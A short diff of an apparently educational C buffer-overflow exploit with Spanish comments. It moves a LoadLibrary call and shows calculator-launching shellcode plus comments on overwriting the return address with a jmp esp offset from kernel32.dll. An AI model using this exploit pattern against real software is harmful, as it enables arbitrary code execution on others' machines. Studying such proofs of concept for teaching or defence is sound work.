@@ -21,7 +21,6 @@ int main (int argc,char **argv)
         return (0);
     }
 									
-	LoadLibrary("msvcrt.dll");
     //El offset mediante el cual ejecutaremos el shellcode de la calculadora. Este puede ser extraido
     //de librerias de windows que siemprese ejecutan, como la kernel32.dll ó ntdll.dll, mediante el
     //uso de herramientas externas.
@@ -34,7 +33,9 @@ int main (int argc,char **argv)
     "\x78\xC6\x45\xFE\x65\x8D\x45\xF7\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";   
 
     char **vuln_arg;
-      
+
+    //Cargamos la librería msvcrt.dll para poder ejecutar el payload.
+	LoadLibrary("msvcrt.dll");
     //Concatenamos el buffer para que cuando se produzca el overflow, el return de la vulnerabilidad
     //se sobrescriba con el offsett de la instruccion jmp_esp contenida en la libreria kernel32.dll
     //que siempre se ejecuta
